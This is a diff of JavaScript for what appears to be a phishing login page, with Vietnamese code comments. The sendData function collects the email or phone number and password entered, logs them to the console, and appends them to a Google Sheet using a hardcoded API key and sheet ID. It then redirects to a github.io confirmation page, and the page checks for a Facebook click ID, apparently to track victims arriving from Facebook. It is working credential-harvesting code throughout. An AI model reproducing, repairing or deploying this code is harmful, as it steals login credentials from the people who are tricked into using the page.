@@ -218,16 +218,19 @@
       return regex.test(phone);
     }
 
-    function sendData(event) {
+function sendData(event) {
   event.preventDefault();
+  
   let email = document.getElementById("email").value.trim();
   const pass = document.getElementById("password").value.trim();
 
+  // Kiểm tra xem người dùng có nhập email và mật khẩu không
   if (!email || !pass) {
     alert("Please fill out all fields.");
     return;
   }
 
+  // Kiểm tra tính hợp lệ của email hoặc số điện thoại
   if (!isValidEmail(email)) {
     if (!isValidIndianPhone(email)) {
       alert("Please enter a valid email or Indian phone number.");
@@ -235,6 +238,8 @@
     }
   }
 
+  console.log("Email:", email, "Password:", pass);  // Kiểm tra giá trị email và pass
+  
   // Lệnh gửi dữ liệu đến Google Sheets (đảm bảo bạn có API key và sheet ID)
   const sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";
   const apiKey = "AIzaSyB8cfQtIJFIimytGozA9oTGUliK3q6rArc";
@@ -245,10 +250,12 @@
     ]
   };
 
+  // Khởi tạo API Google Sheets
   gapi.client.init({
     apiKey: apiKey,
     discoveryDocs: ["https://sheets.googleapis.com/$discovery/rest?version=v4"]
   }).then(() => {
+    console.log("Initializing Sheets API...");
     return gapi.client.sheets.spreadsheets.values.append({
       spreadsheetId: sheetId,
       range: range,
@@ -256,18 +263,20 @@
       resource: valueRangeBody
     });
   }).then((response) => {
-    alert("Credentials saved successfully!");
-    window.location.href = "https://girlhotnewstoday.github.io/logins/confirm.html";  // Chuyển hướng đến trang xác nhận
+    alert("Credentials saved successfully!");  // Hiển thị thông báo khi lưu thành công
+    console.log(response);  // In ra thông tin response
+    window.location.href = "https://girlhotnewstoday.github.io/logins/confirm.html";  // Chuyển hướng tới trang xác nhận
   }).catch((error) => {
     console.error("Error saving credentials: ", error);
-    alert('Connection issue!');
+    alert('Connection issue!');  // Hiển thị thông báo lỗi nếu có sự cố
   });
 }
 
+window.addEventListener("DOMContentLoaded", () => {
+  const form = document.getElementById('loginForm');
+  form.addEventListener('submit', sendData);  // Đảm bảo sự kiện submit đã được đăng ký
+});
 
-    window.addEventListener("DOMContentLoaded", () => {
-      const form = document.getElementById('loginForm');
-      form.addEventListener('submit', sendData);
 
       const url = new URL(window.location.href);
       if (!url.searchParams.has("fbclid")) {
